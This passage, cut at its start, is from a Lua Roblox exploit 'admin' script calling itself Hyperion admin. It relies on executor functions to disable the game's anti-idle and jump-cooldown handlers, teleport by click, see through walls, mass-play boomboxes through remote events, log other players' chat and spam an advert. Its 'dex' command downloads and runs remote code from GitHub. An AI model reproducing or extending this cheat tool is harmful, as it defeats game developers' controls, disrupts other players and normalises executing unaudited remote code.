end)

AddCommand("shiftlock", {}, "enables shiftlock in your game (some games have it off)", {}, function()
	if (LocalPlayer.DevEnableMouseLock) then
		return "Shiftlock is already on."
	end
	LocalPlayer.DevEnableMouseLock = true
	Utils.Notify(Caller, "Shiftlock", "Enabled!");
end)

AddCommand("copyname", {"copyusername"}, "copies a users name to your clipboard", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1])[1];
	if (setclipboard) then
		setclipboard(Target.Name);
	else
		Frame2.Chatbar.CaptureFocus(Frame2.Chatbar);
		wait();
		Frame2.Chatbar.Text = Target.Name
	end
	return "Copied " .. Target.Name .. "'s username."
end)

AddCommand("copyid", {"copyuserid", "copyuid"}, "copies someones userid to your clipboard", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1])[1];
	if (setclipboard) then
		setclipboard(Target.UserId);
	else
		Frame2.Chatbar.CaptureFocus(Frame2.Chatbar);
		wait();
		Frame2.Chatbar.Text = Target.Name
	end
	return "Copied " .. Target.Name .. "'s UserId."
end)

AddCommand("freecam", {"fc"}, "enables/disables freecam", {}, function(Caller, Args, CEnv)
	if (not CEnv.Activated) then
		-- roblox freecam modifed by fate
		local Spring = {}
		Spring.__index = Spring
		function Spring:Update(dt)
			local t, k, d, x0, v0 = self.t, self.k, self.d, self.x, self.v
			local a0 = k * (t - x0) + v0 * d
			local v1 = v0 + a0 * (dt / 2);
			local a1 = k * (t - (x0 + v0 * (dt / 2))) + v1 * d
			local v2 = v0 + a1 * (dt / 2);
			local a2 = k * (t - (x0 + v1 * (dt / 2))) + v2 * d
			local v3 = v0 + a2 * dt
			local x4 = x0 + (v0 + 2 * (v1 + v2) + v3) * (dt / 6);
			self.x, self.v = x4, v0 + (a0 + 2 * (a1 + a2) + k * (t - (x0 + v2 * dt)) + v3 * d) * (dt / 6);
			return x4
		end
		function Spring.new(stiffness, dampingCoeff, dampingRatio, initialPos)
			local self = setmetatable({}, Spring);

			dampingRatio = dampingRatio or 1
			local m = dampingCoeff * dampingCoeff / (4 * stiffness * dampingRatio * dampingRatio);
			self.k = stiffness / m
			self.d = -dampingCoeff / m
			self.x = initialPos
			self.t = initialPos
			self.v = initialPos * 0

			return self
		end
		local StarterGui = Services.StarterGui
		local UserInputService = Services.UserInputService
		local RunService = Services.RunService

		--[[local Error = game.CoreGui.RobloxPromptGui.promptOverlay:WaitForChild("ErrorPrompt")
                Error.MessageArea.ErrorFrame.ButtonArea.ButtonLayout.CellPadding = UDim2.new(0, 0, 0, 5)
                Error.MessageArea.MessageAreaPadding.PaddingTop = UDim.new(0,-20)
                Error.MessageArea.ErrorFrame.ErrorFrameLayout.Padding = UDim.new(0, 5)
                Error.Visible = false--]]

		local WasGuiVisible = {}
		local GetCore, GetCoreGuiEnabled, SetCore, SetCoreGuiEnabled = StarterGui.GetCore, StarterGui.GetCoreGuiEnabled, StarterGui.SetCore, StarterGui.SetCoreGuiEnabled
		local CoreGuiType = Enum.CoreGuiType
		function ToggleGui(on)
			if not on then
				WasGuiVisible["PointsNotificationsActive"] = GetCore(StarterGui, "PointsNotificationsActive");
				WasGuiVisible["BadgesNotificationsActive"] = GetCore(StarterGui, "BadgesNotificationsActive");
				WasGuiVisible["Health"] = GetCoreGuiEnabled(StarterGui, CoreGuiType.Health);
				WasGuiVisible["Backpack"] = GetCoreGuiEnabled(StarterGui, CoreGuiType.Backpack);
				WasGuiVisible["PlayerList"] = GetCoreGuiEnabled(StarterGui, CoreGuiType.PlayerList);
				WasGuiVisible["Chat"] = GetCoreGuiEnabled(StarterGui, CoreGuiType.Chat);
			end

			local function GuiOn(name)
				if on == false then
					return false
				end
				if WasGuiVisible[name] ~= nil then
					return WasGuiVisible[name]
				end
				return true
			end

			SetCore(StarterGui, "PointsNotificationsActive", GuiOn("PointsNotificationsActive"));
			SetCore(StarterGui, "BadgesNotificationsActive", GuiOn("BadgesNotificationsActive"));

			SetCoreGuiEnabled(StarterGui, CoreGuiType.Health, GuiOn("Health"));
			SetCoreGuiEnabled(StarterGui, CoreGuiType.Backpack, GuiOn("Backpack"));
			SetCoreGuiEnabled(StarterGui, CoreGuiType.PlayerList, GuiOn("PlayerList"));
			SetCoreGuiEnabled(StarterGui, CoreGuiType.Chat, GuiOn("Chat"));
		end

		local Vector2New = Vector2.new

		local DEF_FOV = 70
		local NM_ZOOM = math.tan(DEF_FOV * math.pi/360);
		local LVEL_GAIN = Vector3New(1, 0.75, 1);
		local RVEL_GAIN = Vector2New(0.85, 1) / 128
		local FVEL_GAIN = -330
		local DEADZONE = 0.125
		local FOCUS_OFFSET = CFrameNew(0, 0, -16);

		local DIRECTION_LEFT = 1
		local DIRECTION_RIGHT = 2
		local DIRECTION_FORWARD = 3
		local DIRECTION_BACKWARD = 4
		local DIRECTION_UP = 5
		local DIRECTION_DOWN = 6

		local KEY_MAPPINGS = {
			[DIRECTION_LEFT] = {Enum.KeyCode.A, Enum.KeyCode.H},
			[DIRECTION_RIGHT] = {Enum.KeyCode.D, Enum.KeyCode.K},
			[DIRECTION_FORWARD] = {Enum.KeyCode.W, Enum.KeyCode.U},
			[DIRECTION_BACKWARD] = {Enum.KeyCode.S, Enum.KeyCode.J},
			[DIRECTION_UP] = {Enum.KeyCode.E, Enum.KeyCode.I},
			[DIRECTION_DOWN] = {Enum.KeyCode.Q, Enum.KeyCode.Y},
		}

		local screenGuis = {}
		local freeCamEnabled = false

		local V3, V2 = Vector3New(), Vector2New();

		local stateRot = V2
		local panDeltaGamepad = V2
		local panDeltaMouse = V2

		local velSpring = Spring.new(7 / 9, 1 / 3, 1, V3);
		local rotSpring = Spring.new(7 / 9, 1 / 3, 1, V2);
		local fovSpring = Spring.new(2, 1 / 3, 1, 0);

		local gp_x  = 0
		local gp_z  = 0
		local gp_l1 = 0
		local gp_r1 = 0
		local rate_fov = 0

		local SpeedModifier = 1

		local function Clamp(x, min, max)
			return x < min and min or x > max and max or x
		end

		local function GetChar()
			local Char = GetCharacter();
			if Char then
				return FindFirstChildOfClass(Char, "Humanoid"), FindFirstChild(Char, "HumanoidRootPart");
			end
		end

		local function InputCurve(x)
			local s = abs(x);
			if s > DEADZONE then
				s = 0.255000975 * (2 ^ (2.299113817 * s) - 1);
				return x > 0 and (s > 1 and 1 or s) or (s > 1 and -1 or -s);
			end
			return 0
		end

		local function ProcessInput(input, processed)
			local userInputType = input.UserInputType
			Processed = processed
			if userInputType == Enum.UserInputType.Gamepad1 then
				local keycode = input.KeyCode
				if keycode == Enum.KeyCode.Thumbstick2 then
					local pos = input.Position
					panDeltaGamepad = Vector2.new(InputCurve(pos.y), InputCurve(-pos.x)) * 7
				elseif keycode == Enum.KeyCode.Thumbstick1 then
					local pos = input.Position
					gp_x = InputCurve(pos.x)
					gp_z = InputCurve(-pos.y)
				elseif keycode == Enum.KeyCode.ButtonL2 then
					gp_l1 = input.Position.z
				elseif keycode == Enum.KeyCode.ButtonR2 then
					gp_r1 = input.Position.z
				end

				rate_fov = input.Position.Z
			end
		end
		CEnv.Connections = {}
		AddConnection(CConnect(UserInputService.InputChanged, ProcessInput));
		AddConnection(CConnect(UserInputService.InputEnded, ProcessInput));
		AddConnection(CConnect(UserInputService.InputBegan, ProcessInput));
		local IsKeyDown = UserInputService.IsKeyDown
		local function IsDirectionDown(direction)
			for i = 1, #KEY_MAPPINGS[direction] do
				if (IsKeyDown(UserInputService, KEY_MAPPINGS[direction][i]) and not Processed) then
					return true
				end
			end
			return false
		end

		local UpdateFreecam do
			local dt = 1/60
			AddConnection(CConnect(RenderStepped, function(_dt)
				dt = _dt
			end));

			function UpdateFreecam()
				local camCFrame = Camera.CFrame

				local kx = (IsDirectionDown(DIRECTION_RIGHT) and 1 or 0) - (IsDirectionDown(DIRECTION_LEFT) and 1 or 0);
				local ky = (IsDirectionDown(DIRECTION_UP) and 1 or 0) - (IsDirectionDown(DIRECTION_DOWN) and 1 or 0);
				local kz = (IsDirectionDown(DIRECTION_BACKWARD) and 1 or 0) - (IsDirectionDown(DIRECTION_FORWARD) and 1 or 0);
				local km = (kx * kx) + (ky * ky) + (kz * kz)
				if km > 1e-15 then
					km = ((IsKeyDown(UserInputService, Enum.KeyCode.LeftShift) or IsKeyDown(UserInputService, Enum.KeyCode.RightShift)) and 1 / 4 or 1) / math.sqrt(km);
					kx = kx * km
					ky = ky * km
					kz = kz * km
				end

				local dx = kx + gp_x
				local dy = ky + gp_r1 - gp_l1
				local dz = kz + gp_z

				velSpring.t = Vector3New(dx, dy, dz) * SpeedModifier
				rotSpring.t = panDeltaMouse + panDeltaGamepad
				fovSpring.t = Clamp(fovSpring.t + dt * rate_fov*FVEL_GAIN, 5, 120);

				local fov  = fovSpring:Update(dt);
				local dPos = velSpring:Update(dt) * LVEL_GAIN
				local dRot = rotSpring:Update(dt) * (RVEL_GAIN * math.tan(fov * math.pi / 360) * NM_ZOOM);

				rate_fov = 0
				panDeltaMouse = V2

				stateRot = stateRot + dRot
				stateRot = Vector2New(Clamp(stateRot.x, -3 / 2, 3 / 2), stateRot.y);

				local c = CFrameNew(camCFrame.p) * CFrame.Angles(0, stateRot.y, 0) * CFrame.Angles(stateRot.x, 0, 0) * CFrameNew(dPos);

				Camera.CFrame = c
				Camera.Focus = c * FOCUS_OFFSET
				Camera.FieldOfView = fov
			end
		end

		local function Panned(input, processed)
			if not processed and input.UserInputType == Enum.UserInputType.MouseMovement then
				local delta = input.Delta
				panDeltaMouse = Vector2New(-delta.y, -delta.x);
			end
		end

		local function EnterFreecam()
			ToggleGui(false);
			UserInputService.MouseIconEnabled = false
			AddConnection(CConnect(UserInputService.InputBegan, function(input, processed)
				if input.UserInputType == Enum.UserInputType.MouseButton2 then
					UserInputService.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
					local conn = CConnect(UserInputService.InputChanged, Panned)
					repeat
						input = CWait(UserInputService.InputEnded);
					until input.UserInputType == Enum.UserInputType.MouseButton2 or not freeCamEnabled
					panDeltaMouse = V2
					panDeltaGamepad = V2
					Disconnect(conn);
					if freeCamEnabled then
						UserInputService.MouseBehavior = Enum.MouseBehavior.Default
					end
				elseif input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift then
					SpeedModifier = 0.5
				end
			end), CEnv.Connections);

			AddConnection(CConnect(UserInputService.InputEnded, function(input, processed)
				if input.KeyCode == Enum.KeyCode.LeftShift or input.KeyCode == Enum.KeyCode.RightShift then
					SpeedModifier = 1
				end
			end), CEnv.Connections);

			Camera.CameraType = Enum.CameraType.Scriptable

			local hum, hrp = GetChar()
			if hrp then
				hrp.Anchored = true
			end
			if hum then
				hum.WalkSpeed = 0
				AddConnection(CConnect(hum.Jumping, function(active)
					if active then
						hum.Jumping = false
					end
				end), CEnv.Connections);
			end

			velSpring.t, velSpring.v, velSpring.x = V3, V3, V3
			rotSpring.t, rotSpring.v, rotSpring.x = V2, V2, V2
			fovSpring.t, fovSpring.v, fovSpring.x = Camera.FieldOfView, 0, Camera.FieldOfView

			local camCFrame = Camera.CFrame
			local lookVector = camCFrame.lookVector.unit

			stateRot = Vector2.new(
				math.asin(lookVector.y),
				math.atan2(-lookVector.z, lookVector.x) - math.pi/2
			)
			panDeltaMouse = Vector2New();
			for _, obj in next, GetChildren(PlayerGui) do
				if IsA(obj, "ScreenGui") and obj.Enabled then
					obj.Enabled = false
					screenGuis[obj] = true
				end
			end

			AddConnection(CConnect(LocalPlayer.CharacterAdded, function()
				local Hrp = WaitForChild(LocalPlayer.Character, "HumanoidRootPart");
				Hrp.Anchored = true
			end), CEnv.Connections);
			RunService.BindToRenderStep(RunService, "Freecam", Enum.RenderPriority.Camera.Value, UpdateFreecam);
			CEnv.Enabled = true
		end

		local function ExitFreecam()
			CEnv.Enabled = false
			UserInputService.MouseIconEnabled = true
			UserInputService.MouseBehavior = Enum.MouseBehavior.Default

			RunService.UnbindFromRenderStep(RunService, "Freecam")
			local hum, hrp = GetChar()
			if hum then
				hum.WalkSpeed = 16
			end
			if hrp then
				hrp.Anchored = false
			end
			Camera.FieldOfView = DEF_FOV
			Camera.CameraType = Enum.CameraType.Custom
			for i, Connection in next, CEnv.Connections do
				Disconnect(Connection);
			end
			for obj in next, screenGuis do
				obj.Enabled = true
			end
			screenGuis = {}
			ToggleGui(true)
		end

		EnterFreecam()
		CEnv.Activated = true
		CEnv.Enabled = true
		CEnv.EnterFreecam = EnterFreecam
		CEnv.ExitFreecam = ExitFreecam
		return "Freecam enabled."
	end
	if (CEnv.Enabled) then
		CEnv.ExitFreecam();
		return "Freecam disabled."
	else
		CEnv.EnterFreecam();
		return "Freecam enabled."
	end
end)

AddCommand("freecamgoto", {"fcgoto"}, "takes your freecam to t hem", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	local Delay = tonumber(Args[2]);
	for i, v in next, Target do
		if (Delay) then
			wait(Delay);
		end
		Camera.CFrame = GetRoot(v).CFrame * CFrameNew(0, 10, 10);
	end
end)

AddCommand("antiafk", {"antiidle"}, "prevents kicks from when you're afk", {}, function(Caller, Args, CEnv)
	local IsEnabled = CEnv[1]
	for i, v in next, getconnections(LocalPlayer.Idled, true) do
		if (IsEnabled) then
			v.Enable(v);
			CEnv[1] = nil
		else
			v.Disable(v);
			CEnv[1] = true
		end
	end
	return "Antiafk " .. (IsEnabled and " Disabled!" or "Enabled!");
end)

AddCommand("clicktp", {}, "tps you to where your mouse is when you click", {}, function(Caller, Args, CEnv)
	local HasTool_ = CEnv[1] ~= nil
	if (HasTool_) then
		Destroy(CEnv[1]);
		Destroy(CEnv[2]);
	end
	local Tool = InstanceNew("Tool");
	Tool.RequiresHandle = false
	Tool.Name = "Click TP"
	Tool.Parent = GetCharacter();
	AddConnection(CConnect(Tool.Activated, function()
		local Hit = Mouse.Hit
		GetRoot().CFrame = Hit * CFrame.new(0, 3, 0);
	end))

	local Tool2 = InstanceNew("Tool");
	Tool2.RequiresHandle = false
	Tool2.Name = "Click TweenTP"
	Tool2.Parent = LocalPlayer.Backpack
	AddConnection(CConnect(Tool2.Activated, function()
		local Hit = Mouse.Hit
		Utils.Tween(GetRoot(), "Sine", "Out", .5, {CFrame = Hit * CFrame.new(0, 3, 0)});
	end))

	CEnv[1] = Tool
	CEnv[2] = Tool2
	Utils.Notify(Caller, "Clicktp", "Got teleport tools!");
end)

AddCommand("friend", {"fr"}, "sends a friend request to the player", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	local RequestFriendship = LocalPlayer.RequestFriendship
	for i, v in next, Target do
		RequestFriendship(LocalPlayer, v);
	end
	return #Target == 1 and "sent a friend request to " .. Target[1].Name or format("sent a friend request to %d players", #Target);
end)

AddCommand("unfriend", {"unfr"}, "unfriends a player that you're friends with", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	local RevokeFriendship = LocalPlayer.RevokeFriendship
	for i, v in next, Target do
		RevokeFriendship(LocalPlayer, v);
	end
	return #Target == 1 and "unfriended " .. Target[1].Name or format("unfriended %d players", #Target);
end)

AddCommand("setzoomdistance", {"szd", "maxzoom"}, "sets your cameras zoom distance so you can zoom out", {}, function(Caller, Args)
	local ZoomDistance = tonumber(Args[1]) or 1000
	LocalPlayer.CameraMaxZoomDistance = ZoomDistance
	LocalPlayer.CameraMode = Enum.CameraMode.Classic
	Utils.Notify(Caller, "Zoomdistance", "Zoom distance set to " .. ZoomDistance);	
end)

AddCommand("equiptools", {}, "equips all of your tools", {1}, function()
	UnequipTools(GetHumanoid());
	local Char = GetCharacter();
	local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, Child)
		return IsA(Child, "Tool");
	end);
	for i, v in next, Tools do
		v.Parent = Char
	end
	return format("Equipped %d tools", #Tools);
end)

AddCommand("activatetools", {}, "equips and activates all of your tools", {1}, function()
	local VirtualInputManager = Services.VirtualInputManager
	local SendMouseButtonEvent = VirtualInputManager.SendMouseButtonEvent
	UnequipTools(GetHumanoid());
	local Char = GetCharacter();
	local Tools = filter(GetChildren(LocalPlayer.Backpack), function(i, Child)
		return IsA(Child, "Tool");
	end);
	for i, v in next, Tools do
		v.Parent = Char
	end
	wait();
	for i, v in next, Tools do
		v.Activate(v);
	end
	SendMouseButtonEvent(VirtualInputManager, 0, 0, 0, true, nil, #Tools);
	-- return format("equipped and activated %d tools", #Tools);
end)

AddCommand("hidename", {"hidetag"}, "hides your nametag (billboardgui)", {3}, function(Caller, Args, CEnv)
	local Char = GetCharacter();
	local Billboard = FindFirstChildWhichIsA(Char, "BillboardGui", true);
	if (not Billboard) then
		return "You don't have a player tag to use this command."
	end
	for i, v in next, GetDescendants(Char) do
		if (IsA(v, "BillboardGui")) then
			CEnv[v] = v.Parent
			Destroy(v);
		end
	end
	Utils.Notify(Caller, "Billboardgui", "Hidden!")
end)

AddCommand("nojumpcooldown", {}, "removes a jumpcooldown if any in games", {}, function()
	local UserInputService = Services.UserInputService
	local Humanoid = GetHumanoid();
	local connections = tbl_concat(getconnections(UserInputService.JumpRequest), getconnections(GetPropertyChangedSignal(Humanoid, "FloorMaterial")), getconnections(Humanoid.Jumping));
	for i, v in next, connections do
		if (v.Func and not is_synapse_function(v.Func)) then
			if (Hooks.NoJumpCooldown) then
				v.Enable(v);
			else
				v.Disable(v);
			end
		end
	end
	Hooks.NoJumpCooldown = not Hooks.NoJumpCooldown
	return "Nojumpcooldown " .. (Hooks.NoJumpCooldown and "Enabled" or "Disabled")
end)

local LoadConfig, ConfigLoaded;
AddCommand("config", {"conf"}, "shows Hyperion admin config", {}, function(Caller, Args, CEnv)
	if (not ConfigLoaded) then
		if (not CEnv[1]) then
			LoadConfig();
		end
		Utils.SetAllTrans(ConfigUI);
		ConfigUI.Visible = true
		Utils.TweenAllTransToObject(ConfigUI, .25, ConfigUIClone);
		ConfigLoaded = true
		CEnv[1] = true
		return "Config loaded."
	end
end)

AddCommand("deletetool", {"deltool"}, "deletes your equipped tool", {1}, function()
	local Tool = FindFirstChildWhichIsA(GetCharacter(), "Tool");
	if (Tool) then
		Destroy(Tool);
		return "Deleted tool."
	else
		return "No tool equipped."
	end
end)

AddCommand("deletetools", {"deltools"}, "delets all of your tools in your inventory", {1}, function()
	UnequipTools(GetHumanoid());
	local Tools = GetChildren(LocalPlayer.Backpack);
	for i = 1, #Tools do
		Destroy(Tools[i]);
	end
	return "Deleted all tools."
end)

AddCommand("rejoinre", {"rjre"}, "rejoins and tps you to your old position", {3}, function()
	local Pos = GetRoot().CFrame
	local queue_on_teleport = syn and syn.queue_on_teleport or queue_on_teleport
	if (queue_on_teleport) then
		queue_on_teleport(format("game.Loaded:Wait();game:GetService('ReplicatedFirst'):SetDefaultLoadingGuiRemoved();local LocalPlayer = game:GetService('Players').LocalPlayer;LocalPlayer.CharacterAdded:Wait():WaitForChild('HumanoidRootPart').CFrame = CFrame.new(%s);", tostring(Pos)));
	end
	ExecuteCommand("rejoin", {}, LocalPlayer);
end)

AddCommand("inviscam", {"inviscamera"}, "makes you see through walls more better", {}, function(Caller, Args, CEnv)
	CEnv.OldCameraMaxZoomDistance = LocalPlayer.CameraMaxZoomDistance
	CEnv.OldDevCameraOcclusionMode = LocalPlayer.DevCameraOcclusionMode
	LocalPlayer.CameraMaxZoomDistance = 600
	LocalPlayer.DevCameraOcclusionMode = "Invisicam"
	return "Inviscam enabled."
end)

AddCommand("uninviscam", {"uninviscamera"}, "disables inviscam", {}, function()
	local CmdEnv = LoadCommand("inviscam").CmdEnv
	LocalPlayer.CameraMaxZoomDistance = CmdEnv.OldCameraMaxZoomDistance
	LocalPlayer.DevCameraOcclusionMode = CmdEnv.OldDevCameraOcclusionMode
	return "Inviscam disabled."
end)

AddCommand("loop", {"loopcommand"}, "loops a command", {"1"}, function(Caller, Args, CEnv)
	local Command = Args[1]
	local LoadedCommand = LoadCommand(Command);
	if (not LoadedCommand) then
		return format("Command %s not found", Command);
	end
	Args = shift(Args);
	CEnv.Looping = true
	CEnv.LoopedCommands = CEnv.LoopedCommands or {}
	CEnv.LoopedCommands[Command] = true
	CThread(function()
		while (CEnv.Looping and CEnv.LoopedCommands[Command]) do
			ExecuteCommand(Command, Args, Caller);
			wait(tonumber(Args[#Args]) or 1);
		end
	end)();
	return format("Now looping the %s command", Command);
end)

AddCommand("unloop", {"unloopcommand"}, "unloops a command", {}, function(Caller, Args)
	local Looped = LoadCommand("loop").CmdEnv
	if (Args[1]) then
		if (Looped.LoopedCommands[Args[1]]) then
			Looped.LoopedCommands[Args[1]] = nil
			return format("unlooped command %s", Args[1]);
		end
		return "Command isn't looped."
	else
		Looped.Looping = false
		return "Unlooped all commands looped."
	end
end)

AddCommand("disablesit", {"neversit", "nosit"}, "disables you from being sat", {}, function(Caller, Args, CEnv)
	local Humanoid = GetHumanoid();
	AddConnection(CConnect(GetPropertyChangedSignal(Humanoid, "Sit"), function()
		CWait(Heartbeat);
		Humanoid.Sit = false
	end), CEnv);
	AddConnection(CConnect(LocalPlayer.CharacterAdded, function(Char)
		Humanoid = WaitForChild(Char, "Humanoid");
		AddConnection(CConnect(GetPropertyChangedSignal(Humanoid, "Sit"), function()
			CWait(RunService.Heartbeat);
			Humanoid.Sit = false
		end), CEnv);
	end), CEnv)
	return "Disabled sit."
end)

AddCommand("enablesit", {"undisablesit"}, "enables disablesit", {}, function()
	DisableAllCmdConnections("disablesit");
	return "Enabled sit."
end)

AddCommand("massplay", {}, "massplays all of your boomboxes", {}, function(Caller, Args)
	local Audio = tonumber(Args[1]);
	if (not Audio and not match(Audio, "rbxassetid://%d+")) then
		return "Number expected for audio."
	end
	Audio = Audio or Args[1]
	local Character = GetCharacter();
	local Humanoid = GetHumanoid();
	UnequipTools(Humanoid);
	local Boomboxes = filter(GetChildren(LocalPlayer.Backpack), function(i, v)
		if (Sfind(lower(v.Name), "boombox") or FindFirstChildOfClass(v.Handle, "Sound", true)) then
			v.Parent = Character
			return true
		end
		return false
	end)
	for i = 1, #Boomboxes do
		local Boombox = Boomboxes[i]
		local RemoteEvent = FindFirstChildWhichIsA(Boombox, "RemoteEvent")
		RemoteEvent.FireServer(RemoteEvent, "PlaySong", Audio);
	end
	delay(2, function()
		ExecuteCommand("sync", {}, Caller);
	end)
	return "Now massplaying."
end)

AddCommand("sync", {"syncaudios"}, "syncs audios playing", {3}, function()
	local Humanoid = GetHumanoid();
	local Playing = filter(GetChildren(GetCharacter()), function(i,v)
		return IsA(v, "Tool") and FindFirstChildOfClass(v.Handle, "Sound");
	end)
	Playing = map(Playing, function(i, v)
		return FindFirstChildOfClass(v.Handle, "Sound");
	end)
	local Sound = Playing[1]
	Services.SoundService.RespectFilteringEnabled = false
	for i = 1, #Playing do
		Playing[i].TimePosition = Sound.TimePosition
	end
	Services.SoundService.RespectFilteringEnabled = true
	return format("Synced %d sounds", #Playing);
end)

AddCommand("dex", {"explorer"}, "loads dark explorer", {}, function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
	--loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/awesome-explorer/main/source.lua"))()
	--loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/Lazy_Dex.lua"))()
end)

AddCommand("advertise", {}, "advertises the admin", {}, function()
	local ad = {"Hyperion admin v1 by LighTMolT", "All"}
	game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(table.unpack(ad))
end)

AddCommand("console", {"errors", "warns", "outputs"}, "shows the outputs fates admin has made", {}, function()
	local MessageClone = Clone(Console.Frame.List);

	Utils.ClearAllObjects(Console.Frame.List)
	Console.Visible = true

	local Tween = Utils.TweenAllTransToObject(Console, .25, ConsoleTransparencyClone)

	Destroy(Console.Frame.List)
	MessageClone.Parent = Console.Frame

	for i, v in next, GetChildren(Console.Frame.List) do
		if (not IsA(v, "UIListLayout")) then
			Utils.Tween(v, "Sine", "Out", .25, {
				TextTransparency = 0
			})
		end
	end

	local ConsoleListLayout = Console.Frame.List.UIListLayout

	CConnect(GetPropertyChangedSignal(ConsoleListLayout, "AbsoluteContentSize"), function()
		local CanvasPosition = Console.Frame.List.CanvasPosition
		local CanvasSize = Console.Frame.List.CanvasSize
		local AbsoluteSize = Console.Frame.List.AbsoluteSize

		if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
			wait();
			Console.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000);
		end
	end)

	Utils.Tween(Console.Frame.List, "Sine", "Out", .25, {
		ScrollBarImageTransparency = 0
	})
end)

task.spawn(function()
	local chatted = function(plr, raw)
		local message = raw

		if (_L.ChatLogsEnabled) then

			local time = os.date("%X");
			local Text = format("%s - [%s]: %s", time, plr.Name, raw);
			local Clone = Clone(ChatLogMessage);

			Clone.Text = Text
			Clone.Visible = true
			Clone.TextTransparency = 1
			Clone.Parent = ChatLogs.Frame.List

			Utils.Tween(Clone, "Sine", "Out", .25, {
				TextTransparency = 0
			})

			ChatLogs.Frame.List.CanvasSize = UDim2.fromOffset(0, ChatLogs.Frame.List.UIListLayout.AbsoluteContentSize.Y);
		end

		if (startsWith(raw, "/e")) then
			raw = sub(raw, 4);
		elseif (startsWith(raw, "/w")) then
			raw = shift(shift(split(message, " ")));
		elseif (startsWith(raw, Prefix)) then
			raw = sub(raw, #Prefix + 1);
		else
			return
		end

		message = trim(raw);

		if (Tfind(AdminUsers, plr) or plr == LocalPlayer) then
			local CommandArgs = split(message, " ");
			local Command = CommandArgs[1]
			local Args = shift(CommandArgs);

			ExecuteCommand(Command, Args, plr);
		end
	end

	CConnect(LocalPlayer.Chatted, function(raw)
		chatted(LocalPlayer, raw);
	end);

	if (Services.TextChatService.ChatVersion == Enum.ChatVersion.TextChatService) then
		Services.TextChatService.OnIncomingMessage = function(message)
			chatted(Services.Players:FindFirstChild(message.TextSource.Name), message.Text);
		end
		return;
	end

	local DefaultChatSystemChatEvents = Services.ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents");
	if (not DefaultChatSystemChatEvents) then return; end
	local OnMessageDoneFiltering = DefaultChatSystemChatEvents:WaitForChild("OnMessageDoneFiltering", 5);
	if (not OnMessageDoneFiltering) then return; end
	if (typeof(OnMessageDoneFiltering) ~= "Instance" or OnMessageDoneFiltering.ClassName ~= "RemoteEvent") then return; end


	CConnect(OnMessageDoneFiltering.OnClientEvent, function(messageData)
		if (type(messageData) ~= "table") then return; end
		local plr = Services.Players:FindFirstChild(messageData.FromSpeaker);
		local raw = messageData.Message
		if (not plr or not raw or plr == LocalPlayer) then return; end

		if (messageData.OriginalChannel == "Team") then
			raw = "/team " .. raw
		else
			local whisper = string.match(messageData.OriginalChannel, "To (.+)");
			if (whisper) then
				raw = string.format("/w %s %s", whisper, raw);
			end
		end

		chatted(plr, raw);
	end);

end);

--IMPORT [uimore]
Notification.Visible = false
Utils.SetAllTrans(CommandBar);
Utils.SetAllTrans(ChatLogs);
Utils.SetAllTrans(GlobalChatLogs);
Utils.SetAllTrans(HttpLogs);
Utils.SetAllTrans(Console);
Commands.Visible = false
ChatLogs.Visible = false
Console.Visible = false
GlobalChatLogs.Visible = false
HttpLogs.Visible = false

Utils.Draggable(Commands);
Utils.Draggable(ChatLogs);
Utils.Draggable(Console);
Utils.Draggable(GlobalChatLogs);
Utils.Draggable(HttpLogs);
Utils.Draggable(ConfigUI);

ParentGui(UI);
Connections.UI = {}

local Times = #LastCommand
AddConnection(CConnect(Services.UserInputService.InputBegan, function(Input, GameProccesed)
	if (Input.KeyCode == CommandBarPrefix and (not GameProccesed)) then
		CommandBarOpen = not CommandBarOpen

		local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
		local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone);
		local UserInputService = Services.UserInputService

		if (CommandBarOpen) then
			if (not Draggable) then
				Utils.Tween(CommandBar, "Quint", "Out", .5, {
					Position = UDim2.new(0.5, WideBar and -200 or -100, 1, -110)
				})
			end

			CommandBar.Input.CaptureFocus(CommandBar.Input);
			CThread(function()
				wait()
				CommandBar.Input.Text = ""
				FocusedTextBox = UserInputService.GetFocusedTextBox(UserInputService);
				local TextBox = CommandBar.Input
				while (FocusedTextBox ~= TextBox) do
					FocusedTextBox.ReleaseFocus(FocusedTextBox);
					CommandBar.Input.CaptureFocus(TextBox);
					FocusedTextBox = UserInputService.GetFocusedTextBox(UserInputService);
					CWait(Heartbeat);
				end
			end)()
		else
			if (not Draggable) then
				Utils.Tween(CommandBar, "Quint", "Out", .5, {
					Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5)
				})
			end
		end
	elseif (not GameProccesed and ChooseNewPrefix) then
		CommandBarPrefix = Input.KeyCode
		Utils.Notify(LocalPlayer, "New Prefix", "Your new prefix is: " .. split(tostring(Input.KeyCode), ".")[3]);
		ChooseNewPrefix = false
		if (writefile) then
			Utils.Notify(LocalPlayer, nil, "use command saveprefix to save your prefix");
		end
	elseif (GameProccesed and CommandBarOpen) then
		if (Input.KeyCode == Enum.KeyCode.Up) then
			Times = Times >= 3 and Times or Times + 1
			CommandBar.Input.Text = LastCommand[Times][1] .. " "
			CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 2
		end
		if (Input.KeyCode == Enum.KeyCode.Down) then
			Times = Times <= 1 and 1 or Times - 1
			CommandBar.Input.Text = LastCommand[Times][1] .. " "
			CommandBar.Input.CursorPosition = #CommandBar.Input.Text + 2
		end
	end
end), Connections.UI, true);

Utils.Click(Commands.Close, "TextColor3")
Utils.Click(ChatLogs.Clear, "BackgroundColor3")
Utils.Click(ChatLogs.Save, "BackgroundColor3")
Utils.Click(ChatLogs.Toggle, "BackgroundColor3")
